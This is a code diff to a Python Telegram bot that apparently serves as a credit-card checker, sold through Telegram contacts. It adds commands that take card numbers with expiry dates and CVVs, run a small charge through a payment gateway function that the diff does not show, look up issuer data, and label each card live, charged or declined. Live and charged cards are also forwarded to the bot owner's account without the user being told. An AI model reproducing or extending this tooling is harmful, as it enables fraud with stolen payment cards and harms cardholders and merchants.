@@ -195,6 +195,56 @@ Required Owner ID: 1172862169
 
 Dm @ghostxdy Tᴏ Bᴜʏ Pʀᴇᴍɪᴜm""")
 
+@bot.message_handler(commands=["help", "commands"])
+def help_command(message):
+    user_id = message.from_user.id
+    
+    if is_user_allowed(user_id):
+        help_text = f"""
+🤖 <b>Card Checker Bot - Help</b>
+
+👤 <b>Your ID:</b> <code>{user_id}</code>
+✅ <b>Status:</b> Authorized
+
+📋 <b>Available Commands:</b>
+
+<b>For Card Checking:</b>
+• <code>/check CARD</code> - Check single card (private chat)
+• <code>/single CARD</code> - Same as /check
+• <code>/chk CARD</code> - Check single card (group only)
+• Upload .txt file - Check multiple cards
+
+<b>For Information:</b>
+• <code>/start</code> - Get your User ID
+• <code>/info</code> - Show your information
+• <code>/help</code> - Show this help message
+• <code>/chatid</code> - Show chat information
+
+<b>Card Format:</b>
+<code>4532640527811643|12|2025|123</code>
+
+<b>Support:</b> @god_forever
+"""
+    else:
+        help_text = f"""
+🤖 <b>Card Checker Bot - Help</b>
+
+👤 <b>Your ID:</b> <code>{user_id}</code>
+❌ <b>Status:</b> Not Authorized
+
+📋 <b>Available Commands:</b>
+• <code>/start</code> - Get your User ID
+• <code>/info</code> - Show your information
+• <code>/help</code> - Show this help message
+
+🔐 <b>To Get Access:</b>
+Contact @god_forever for authorization
+
+<b>Support:</b> @god_forever
+"""
+    
+    bot.reply_to(message, help_text, parse_mode="HTML")
+
 LOGS_GROUP_CHAT_ID = -4970290554 # Replace with your logs group chat ID
 
 @bot.message_handler(commands=["add"])
@@ -558,6 +608,124 @@ def user_stats(message):
     else:
         bot.reply_to(message, "🚫 You are not authorized to view statistics.")
 
+@bot.message_handler(commands=["check", "single"])
+def single_check(message):
+    try:
+        # Check if user is authorized
+        if not is_user_allowed(message.from_user.id):
+            bot.reply_to(message, "You are not authorized to use this bot. for authorization dm to @god_forever")
+            return
+        
+        # Check if it's a private chat
+        if message.chat.type != "private":
+            bot.reply_to(message, "This command can only be used in private chat with the bot.")
+            return
+        
+        # Extract the card number from the command
+        if len(message.text.split()) < 2:
+            bot.reply_to(message, "Please provide a valid card number.\n\n<b>Usage:</b>\n<code>/check 4532640527811643|12|2025|123</code>\n<code>/single 4532640527811643|12|2025|123</code>", parse_mode="HTML")
+            return
+        
+        cc = message.text.split('/check ')[1] if '/check ' in message.text else message.text.split('/single ')[1]
+        username = message.from_user.username or "N/A"
+
+        try:
+            initial_message = bot.reply_to(message, "🔍 <b>Checking your card...</b>\n\n⏳ Please wait while I process your request...", parse_mode="HTML")
+        except telebot.apihelper.ApiTelegramException:
+            initial_message = bot.send_message(message.chat.id, "🔍 <b>Checking your card...</b>\n\n⏳ Please wait while I process your request...", parse_mode="HTML")
+
+        # Get the response from the `Tele` function
+        try:
+            last = str(Tele(cc))
+        except Exception as e:
+            print(f"Error in Tele function: {e}")
+            last = "An error occurred."
+
+        # Fetch BIN details
+        try:
+            response = requests.get(f'https://bins.antipublic.cc/bins/{cc[:6]}')
+            if response.status_code == 200:
+                data = response.json()  # Parse JSON
+            else:
+                print(f"Error: Received status code {response.status_code}")
+                data = {}
+        except Exception as e:
+            print(f"Error fetching BIN data: {e}")
+            data = {}
+
+        # Extract details with fallback values
+        bank = data.get('bank', 'N/A')
+        brand = data.get('brand', 'N/A')
+        emj = data.get('country_flag', 'N/A')
+        cn = data.get('country_name', 'N/A')
+        dicr = data.get('level', 'N/A')
+        typ = data.get('type', 'N/A')
+        url = data.get('bank', {}).get('url', 'N/A') if isinstance(data.get('bank'), dict) else 'N/A'
+        
+        if "requires_action" in last:
+            message_ra = f'''✅ <b>LIVE CARD FOUND!</b>
+
+💳 <b>Card:</b> <code>{cc}</code>
+🏦 <b>Gateway:</b> 1$ Charged
+📊 <b>Response:</b> VBV Required
+
+ℹ️ <b>Info:</b> {brand} - {typ} - {dicr}
+🏛️ <b>Issuer:</b> {bank}
+🌍 <b>Country:</b> {cn} {emj}
+
+⏱️ <b>Time:</b> 0 seconds
+👤 <b>Checked By:</b> @{username}
+🤖 <b>Bot By:</b> @god_forever'''
+            bot.edit_message_text(message_ra, chat_id=message.chat.id, message_id=initial_message.message_id, parse_mode="HTML")
+            
+            # Send to owner
+            try:
+                bot.send_message(1172862169, f"🎯 <b>LIVE CARD FOUND!</b>\n\n{message_ra}", parse_mode="HTML")
+            except:
+                pass
+                
+        elif "succeeded" in last:
+            msg_sec = f'''✅ <b>CHARGED CARD FOUND!</b>
+
+💳 <b>Card:</b> <code>{cc}</code>
+🏦 <b>Gateway:</b> 1$ Charged
+📊 <b>Response:</b> Card Charged Successfully
+
+ℹ️ <b>Info:</b> {brand} - {typ} - {dicr}
+🏛️ <b>Issuer:</b> {bank}
+🌍 <b>Country:</b> {cn} {emj}
+
+⏱️ <b>Time:</b> 0 seconds
+👤 <b>Checked By:</b> @{username}
+🤖 <b>Bot By:</b> @god_forever'''
+            bot.edit_message_text(msg_sec, chat_id=message.chat.id, message_id=initial_message.message_id, parse_mode="HTML")
+            
+            # Send to owner
+            try:
+                bot.send_message(1172862169, f"🎯 <b>CHARGED CARD FOUND!</b>\n\n{msg_sec}", parse_mode="HTML")
+            except:
+                pass
+                
+        else:
+            msg_dec = f'''❌ <b>CARD DECLINED</b>
+
+💳 <b>Card:</b> <code>{cc}</code>
+🏦 <b>Gateway:</b> 1$ Charged
+📊 <b>Response:</b> Card Declined
+
+ℹ️ <b>Info:</b> {brand} - {typ} - {dicr}
+🏛️ <b>Issuer:</b> {bank}
+🌍 <b>Country:</b> {cn} {emj}
+
+⏱️ <b>Time:</b> 0 seconds
+👤 <b>Checked By:</b> @{username}
+🤖 <b>Bot By:</b> @god_forever'''
+            bot.edit_message_text(msg_dec, chat_id=message.chat.id, message_id=initial_message.message_id, parse_mode="HTML")
+            
+    except Exception as e:
+        print(f"Unexpected error: {e}")
+        bot.reply_to(message, "❌ An unexpected error occurred. Please try again later.")
+
 @bot.message_handler(commands=["chatid"])
 def get_chat_id(message):
     chat_id = message.chat.id
@@ -594,7 +762,16 @@ last_used = {}
 @bot.message_handler(commands=["chk"])
 def chk(message):
     try:
-        if message.chat.id != allowed_group:
+        # Check if user is authorized
+        if not is_user_allowed(message.from_user.id):
+            bot.reply_to(message, "You are not authorized to use this bot. for authorization dm to @god_forever")
+            return
+        
+        # Allow both private chats and the designated group
+        if message.chat.type == "private":
+            # Private chat - allow single card checking
+            pass
+        elif message.chat.id != allowed_group:
             bot.reply_to(message, "This command can only be used in the designated group. User Must Join the Group @TGSPOOFERS")
             return
     
